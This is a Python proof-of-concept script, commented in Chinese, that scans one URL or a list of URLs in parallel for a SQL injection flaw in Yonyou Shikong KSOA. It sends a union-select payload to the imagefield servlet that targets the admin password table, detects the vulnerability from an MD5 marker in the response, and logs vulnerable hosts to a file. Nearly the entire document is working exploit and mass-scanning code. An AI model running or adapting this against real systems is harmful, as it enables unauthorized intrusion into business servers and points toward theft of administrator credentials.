#用友-时空KSOA SQL注入漏洞

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""  _  __ _____  ____          
 | |/ // ____|/ __ \   /\    
 | ' /| (___ | |  | | /  \   
 |  <  \___ \| |  | |/ /\ \  
 | . \ ____) | |__| / ____ \ 
 |_|\_\_____/ \____/_/    \_\
                             
                             

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='用友-时空KSOA SQL注入漏洞')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    
    payload="/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"

    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Connection':'close',
        'Accept':'*/*',
        'Accept-Language':'en',
        'Accept-Encoding':'gzip',
    }
    headers1={
        'Server':'Apache-Coyote/1.1',
        'Set-Cookie':'JSESSIONID=D26AEC202CC33465C65CA569B5BF3EA4; Path=/',
        'Content-Type':'image/jpeg',
        'Date':'Tue, 27 Feb 2024 02:08:14 GMT',
        'Connection':'close',
        'Content-Length':'34',
    }

    try:
        res1=requests.get(url=target+payload,headers=headers,verify=False)

        if res1.status_code==200 and '0x098f6bcd4621d373cade4e832627b4f6' in res1.text:
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()

